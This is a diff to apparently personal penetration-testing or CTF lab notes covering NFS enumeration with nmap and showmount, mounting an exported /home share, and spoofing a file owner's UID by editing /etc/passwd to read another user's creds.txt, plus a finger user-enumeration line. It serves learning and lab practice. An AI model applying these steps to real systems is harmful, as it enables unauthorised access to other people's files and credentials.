@@ -1,12 +1,50 @@
+- NFS enumeration:
+    > nmap -v -p 111 10.11.1.0/24 -oG rpcbind.txt
+    > nmap -sV -p 111 --script=rpcinfo 10.11.1.0/24
+    > nmap -p 111 --script nfs* 10.11.1.72 
+    > showmount -e 10.11.1.72
+
+
 NFS
 rcpinfo -p <IP>
 showmount <IP> -a
 mount 10.11.1.10:/sites/webdata ./testing
 
+$ ls -1 /usr/share/nmap/scripts/nfs*
+nfs-ls.nse
+nfs-showmount.nse
+nfs-statfs.nse
+
+$ nmap -p 111 --script nfs* 10.11.1.72
+PORT    STATE SERVICE
+111/tcp open  rpcbind
+| nfs-showmount: 
+|_  /home 10.11.0.0/255.255.0.0  - /home directory is being shared and we can access it by mounting it on our Kali virtual machine. 
+
+$ mkdir home
+$ sudo mount -o nolock 10.11.1.72:/home ~/home/
+$ cd home/ && ls
+jenny  joe45  john  marcus  ryuu  - We can see that there are a few home directories for local users on the remote machine.
+/home$ cd marcus
+/home/marcus$ ls -la
+creds.txt   - We do not have permission to view this file. Look at the file permissions, we can see that its owner has a UUID of 1014, and also rwx. 
+
+$ sudo adduser pwn  - the new user has a UUID of 1001. We can change it to 1014 using sed.
+$ sudo sed -i -e 's/1001/1014/g' /etc/passwd - -i option is used to replace the file in-place and the -e option executes a script.
+kali@kali:~/home/marcus$ cat /etc/passwd | grep pwn - Verifying we have chaned the UUID giving us permissions to view creds.txt with the added new user. 
+pwn:x:1014:1014:,,,:/home/pwn:/bin/bash
+
+$ su pwn - Switching to created pwn user.
+$ id - Checking our UID and accessing the data. 
+uid=1014(pwn) gid=1014 groups=1014
+pwn@kali:/root/home/marcus$ cat creds.txt
+
+
+
+
+
 
 CTF Notes
----------
-
 # Enumerate Users via Finger
 finger user@192.168.0.20
 
